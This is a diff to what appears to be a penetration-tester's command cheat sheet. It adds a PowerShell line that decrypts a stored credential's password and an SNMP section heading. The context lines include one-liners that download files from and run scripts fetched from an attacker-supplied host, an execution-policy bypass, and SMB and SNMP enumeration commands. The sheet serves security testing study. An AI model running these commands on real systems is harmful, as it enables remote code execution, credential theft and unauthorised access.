@@ -42,10 +42,13 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://$IP:$PORT/$FI
 IEX (New-Object Net.WebClient).downloadstring("$SCRIPTURL") -> execute .ps1 script remotely
 $COMMAND | powershell -noprofile -> bypass script execution
 cmi -Hidden -> show hidden files and directories
+$UserCred = Import-Clixml -Path $PATH; echo $UserCred.GetNetworkCredential().password -> locally decrypt PSCredential password from XML
 
 # SMB
 smbclient -N -L //$URL/ -> list shares
 smbclient -N //$URL/$SHARE/ -> access share
+
+# SNMP
 onesixtyone -c $COMMUNITYSTRING -i $IPLIST -> check for SNMP community strings (examples: manager, public, private)
 snmpwalk -c $COMMUNITYSTRING -v1 $IP -> try to read MIB endpoint
 
